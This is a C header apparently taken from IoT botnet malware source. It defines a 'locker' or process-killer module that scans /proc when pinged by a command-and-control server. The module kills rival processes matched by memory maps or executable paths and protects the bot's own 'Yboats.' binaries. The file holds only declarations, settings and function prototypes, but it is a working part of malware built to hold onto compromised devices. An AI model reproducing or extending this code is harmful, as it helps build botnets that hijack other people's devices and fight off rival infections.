#ifndef _LOCKER_
#define _LOCKER_

#include <stdint.h>

// LKR SETTINGS
#define LKR_PATH_MAX 256// max filesystem path length
#define LKR_REPEAT 2// will run 2 consecutive scans when pinged by cnc
#define LKR_MAX_PIDS 16// max scanning pids
#define LKR_PROT_PREFIX "Yboats."//protect these file prefixes (Yboats.arm)

// STATE DEFINES
#define LKR_STATE_START  0// killer disabled
#define LKR_STATE_SCAN   1// pid_scanning && pid tasks
#define LKR_STATE_FINISH 2// finish pid tasks 
#define LKR_STATE_EXIT   3// exit and reset to START

enum
{
    LKR_PID_STATUS_CLEAN = 0,// dont kill yet
    LKR_PID_STATUS_KILL  = 1,// found reason to kill
    LKR_PID_STATUS_PROT  = 2,// protect and move on to next pid

    LKR_PID_STATE_NO_PID         = 0,
    LKR_PID_STATE_MAPS_MATCH     = 1,
    LKR_PID_STATE_EXE_PATH_MATCH = 2,
    LKR_PID_STATE_EXE_MATCH      = 3,
    LKR_PID_STATE_KILL           = 4,
    LKR_PID_STATE_FINISHED       = 5
};

// PID STRUCT
struct locker_pid_data_status_t
{
    uint8_t status;
    char found_str[64];
};

struct locker_pid_data_t
{
    int pid;
    char pid_path[LKR_PATH_MAX];// base path Ex. /proc/1/
    uint8_t state;
    struct locker_pid_data_status_t status;
};

struct locker_find_data_t
{
    uint8_t entry[512];
    uint16_t entry_len;
};

void locker_add_kill_path_string(uint8_t *buffer, uint16_t buffer_len);
void locker_clear_kill_path_string(void);
void locker_add_kill_exe_string(uint8_t *buffer, uint16_t buffer_len);
void locker_clear_kill_exe_string(void);


uint8_t locker_isenabled();
uint8_t locker_toggle();
void locker_init();
void locker();

#endif